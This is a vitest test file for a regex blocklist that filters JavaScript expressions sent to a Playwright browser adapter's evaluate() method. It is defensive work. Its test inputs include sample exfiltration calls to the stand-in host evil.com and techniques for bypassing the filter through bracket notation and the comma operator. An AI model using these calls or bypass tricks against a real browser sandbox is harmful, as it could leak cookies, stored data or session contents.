// ============================================================
// evaluate() blocklist — Tests for expression safety validation
// Tests extracted patterns from PlaywrightBrowserAdapter.evaluate
// ============================================================

import { describe, it, expect } from 'vitest';

// We can't instantiate PlaywrightBrowserAdapter without Playwright,
// so we test the blocklist patterns directly (same regex array).
const BLOCKED_PATTERNS = [
  /\bfetch\s*\(/i,
  /\bXMLHttpRequest\b/i,
  /\bimport\s*\(/i,
  /\bdocument\.cookie\b/i,
  /\blocalStorage\b/i,
  /\bsessionStorage\b/i,
  /\beval\s*\(/i,
  /\bFunction\s*\(/i,
  /\bnavigator\s*\.\s*sendBeacon\b/i,
  /\bWebSocket\b/i,
  /\bWorker\s*\(/i,
  /\bSharedWorker\s*\(/i,
  /\bwindow\s*\.\s*open\b/i,
  /\bindexedDB\b/i,
  // Bracket notation bypasses
  /\[\s*['"`](?:fetch|XMLHttpRequest|localStorage|sessionStorage|cookie)['"`]\s*\]/i,
  // Comma-operator bypass: (0,fetch)(url)
  /,\s*fetch\s*\)\s*\(/i,
];

const MAX_EXPRESSION_LENGTH = 10_000;

function isBlocked(expression: string): boolean {
  if (expression.length > MAX_EXPRESSION_LENGTH) return true;
  return BLOCKED_PATTERNS.some(p => p.test(expression));
}

function getBlockReason(expression: string): string | null {
  if (expression.length > MAX_EXPRESSION_LENGTH) return 'expression too long';
  for (const pattern of BLOCKED_PATTERNS) {
    if (pattern.test(expression)) return pattern.source;
  }
  return null;
}

describe('evaluate() blocklist', () => {
  // ── Blocked: fetch ──

  describe('fetch', () => {
    it('blocks fetch("url")', () => expect(isBlocked('fetch("https://evil.com")')).toBe(true));
    it('blocks fetch (url)', () => expect(isBlocked('fetch (url)')).toBe(true));
    it('blocks Fetch("url") (case insensitive)', () => expect(isBlocked('Fetch("url")')).toBe(true));
    it('blocks global fetch with await', () => expect(isBlocked('await fetch("/api")')).toBe(true));
  });

  // ── Blocked: XMLHttpRequest ──

  describe('XMLHttpRequest', () => {
    it('blocks new XMLHttpRequest()', () => expect(isBlocked('new XMLHttpRequest()')).toBe(true));
    it('blocks XMLHttpRequest reference', () => expect(isBlocked('typeof XMLHttpRequest')).toBe(true));
  });

  // ── Blocked: dynamic import ──

  describe('import()', () => {
    it('blocks import("module")', () => expect(isBlocked('import("./evil")')).toBe(true));
    it('blocks import (module)', () => expect(isBlocked('import ("./evil")')).toBe(true));
  });

  // ── Blocked: document.cookie ──

  describe('document.cookie', () => {
    it('blocks document.cookie read', () => expect(isBlocked('document.cookie')).toBe(true));
    it('blocks document.cookie assignment', () => expect(isBlocked('document.cookie = "x=1"')).toBe(true));
  });

  // ── Blocked: Storage APIs ──

  describe('storage APIs', () => {
    it('blocks localStorage.getItem', () => expect(isBlocked('localStorage.getItem("key")')).toBe(true));
    it('blocks localStorage.setItem', () => expect(isBlocked('localStorage.setItem("k","v")')).toBe(true));
    it('blocks sessionStorage.getItem', () => expect(isBlocked('sessionStorage.getItem("key")')).toBe(true));
    it('blocks sessionStorage reference', () => expect(isBlocked('sessionStorage')).toBe(true));
  });

  // ── Blocked: eval / Function ──

  describe('eval / Function constructor', () => {
    it('blocks eval("code")', () => expect(isBlocked('eval("alert(1)")')).toBe(true));
    it('blocks eval (code)', () => expect(isBlocked('eval (code)')).toBe(true));
    it('blocks Function("code")', () => expect(isBlocked('new Function("return 1")')).toBe(true));
    it('blocks Function (code)', () => expect(isBlocked('Function ("code")')).toBe(true));
  });

  // ── Blocked: sendBeacon ──

  describe('navigator.sendBeacon', () => {
    it('blocks navigator.sendBeacon(url)', () => expect(isBlocked('navigator.sendBeacon("https://evil.com", data)')).toBe(true));
    it('blocks navigator .sendBeacon (spaces)', () => expect(isBlocked('navigator . sendBeacon("url")')).toBe(true));
  });

  // ── Blocked: WebSocket ──

  describe('WebSocket', () => {
    it('blocks new WebSocket(url)', () => expect(isBlocked('new WebSocket("ws://evil.com")')).toBe(true));
    it('blocks WebSocket reference', () => expect(isBlocked('WebSocket')).toBe(true));
  });

  // ── Blocked: Workers ──

  describe('Workers', () => {
    it('blocks new Worker(url)', () => expect(isBlocked('new Worker("worker.js")')).toBe(true));
    it('blocks new SharedWorker(url)', () => expect(isBlocked('new SharedWorker("shared.js")')).toBe(true));
  });

  // ── Blocked: window.open ──

  describe('window.open', () => {
    it('blocks window.open(url)', () => expect(isBlocked('window.open("https://evil.com")')).toBe(true));
    it('blocks window . open (spaces)', () => expect(isBlocked('window . open("url")')).toBe(true));
  });

  // ── Blocked: indexedDB ──

  describe('indexedDB', () => {
    it('blocks indexedDB.open', () => expect(isBlocked('indexedDB.open("db")')).toBe(true));
    it('blocks indexedDB reference', () => expect(isBlocked('indexedDB')).toBe(true));
  });

  // ── Blocked: bracket notation bypasses ──

  describe('bracket notation bypasses', () => {
    it('blocks ["fetch"]', () => expect(isBlocked('window["fetch"]("url")')).toBe(true));
    it("blocks ['fetch']", () => expect(isBlocked("window['fetch']('url')")).toBe(true));
    it('blocks [`fetch`]', () => expect(isBlocked('window[`fetch`]("url")')).toBe(true));
    it('blocks ["localStorage"]', () => expect(isBlocked('window["localStorage"].getItem("k")')).toBe(true));
    it('blocks ["sessionStorage"]', () => expect(isBlocked('window["sessionStorage"]')).toBe(true));
    it('blocks ["XMLHttpRequest"]', () => expect(isBlocked('window["XMLHttpRequest"]()')).toBe(true));
    it('blocks ["cookie"]', () => expect(isBlocked('document["cookie"]')).toBe(true));
    it('blocks with spaces in brackets', () => expect(isBlocked('window[ "fetch" ]("url")')).toBe(true));
  });

  // ── Blocked: comma-operator bypass ──

  describe('comma-operator bypass', () => {
    it('blocks (0,fetch)(url)', () => expect(isBlocked('(0,fetch)("https://evil.com")')).toBe(true));
    it('blocks (0, fetch)(url)', () => expect(isBlocked('(0, fetch)("https://evil.com")')).toBe(true));
  });

  // ── Blocked: expression length ──

  describe('expression length limit', () => {
    it('blocks expression exceeding 10KB', () => {
      const longExpr = 'a'.repeat(10_001);
      expect(isBlocked(longExpr)).toBe(true);
    });

    it('allows expression at exactly 10KB', () => {
      const okExpr = 'a'.repeat(10_000);
      expect(isBlocked(okExpr)).toBe(false);
    });
  });

  // ── Allowed: safe expressions ──

  describe('safe expressions (allowed)', () => {
    it('allows document.title', () => expect(isBlocked('document.title')).toBe(false));
    it('allows document.querySelector', () => expect(isBlocked('document.querySelector("h1").textContent')).toBe(false));
    it('allows window.innerWidth', () => expect(isBlocked('window.innerWidth')).toBe(false));
    it('allows JSON.stringify', () => expect(isBlocked('JSON.stringify({a: 1})')).toBe(false));
    it('allows Math operations', () => expect(isBlocked('Math.random() * 100')).toBe(false));
    it('allows DOM element property read', () => expect(isBlocked('document.body.scrollHeight')).toBe(false));
    it('allows Array.from', () => expect(isBlocked('Array.from(document.querySelectorAll("a")).length')).toBe(false));
    it('allows getComputedStyle', () => expect(isBlocked('getComputedStyle(document.body).fontSize')).toBe(false));
    it('allows Date.now()', () => expect(isBlocked('Date.now()')).toBe(false));
    it('allows simple arithmetic', () => expect(isBlocked('1 + 2 * 3')).toBe(false));
    it('allows string with "fetch" as data (no parens)', () => expect(isBlocked('"fetch is a method"')).toBe(false));
    it('allows property named fetchData', () => expect(isBlocked('obj.fetchData')).toBe(false));
  });
});
